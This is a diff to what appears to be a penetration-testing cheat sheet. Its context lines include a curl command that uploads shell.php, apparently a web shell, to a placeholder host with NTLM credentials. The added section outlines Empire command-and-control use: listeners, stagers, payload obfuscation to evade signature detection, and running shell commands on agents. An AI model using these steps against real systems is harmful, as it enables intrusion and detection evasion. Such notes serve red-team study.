@@ -21,3 +21,13 @@ Store username + password for WEBDAV Share----echo -e "/mtn/webdav myUser P@ssw0
 PUT a file with NTLM Auth----curl --ntlm -u domain\\myUser:P@ssw0rd\? -T shell.php http://example.com:8080/shell.php
 
 
+##Empire
+Configure Listeners----uselistener http
+DefaultDelay/DefaultJitter----How often does a beacon phone home?
+Launcher----What the base command looks like
+Headers----Server-side headers presented by the server
+Proxy/ProxyCreds----Web proxy-related settings
+Configure Stager----usestager multi/launcher
+Uses Invoke-Obfuscation----assorted string manipulation to obfuscate signature-based analysis of payloads.
+Interact with Agent----interact AGENTID
+Execute Shell Command----shell ipconfig
